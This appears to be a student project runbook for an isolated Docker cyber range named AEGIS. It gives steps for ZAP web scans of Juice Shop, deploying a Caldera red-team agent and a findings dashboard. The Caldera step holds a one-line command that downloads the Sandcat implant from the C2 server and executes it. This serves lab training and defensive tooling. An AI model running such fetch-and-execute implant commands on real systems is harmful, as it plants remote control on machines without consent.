# AEGIS Midsem Runbook

## Current State

The range already contains Juice Shop, MySQL, and an `employee` host on the
isolated `range_net`. This pass adds OWASP ZAP, MITRE Caldera, and a lightweight
dashboard that unifies tool output into one findings table.

## Start the Range

From `cyber_range/`:

```bash
docker compose up --build
```

Expected local services:

- Juice Shop: `http://localhost:8080`
- Caldera: `http://localhost:8888`
- AEGIS dashboard: `http://localhost:8000`

## ZAP Scan

Run this after `webapp` and `zap` are healthy:

```bash
docker exec zap zap-full-scan.py -t http://webapp:3000 -J /zap/wrk/zap-scan-SC-series.json
docker cp zap:/zap/wrk/zap-scan-SC-series.json ../experiments/results/zap-scan-SC-series.json
```

Refresh the dashboard. ZAP alerts are read from `experiments/results/*.json`
where the filename contains `zap`.

## Caldera Operation

Start Sandcat from the `employee` container:

```bash
docker exec -it employee bash -lc "curl -s -X POST http://caldera:8888/file/download -H 'file:sandcat.go' -H 'platform:linux' -o sandcat && chmod +x sandcat && ./sandcat -server http://caldera:8888 -group red"
```

In Caldera, run a safe discovery ability such as System Information Discovery
(`T1082`) against the `red` group. Export the operation report as JSON and save
it to:

```text
experiments/results/caldera-op-SC-series.json
```

The dashboard ingests Caldera reports when the filename contains `caldera`.

## Dashboard API

Without containers, the dashboard can be run directly from the repo root:

```bash
python backend/aegis_dashboard.py
```

Endpoints:

- `GET /api/health`
- `GET /api/findings`

When no automated reports exist yet, the API falls back to checked-in scenario
YAML so the frontend remains demoable while scan artifacts are pending.
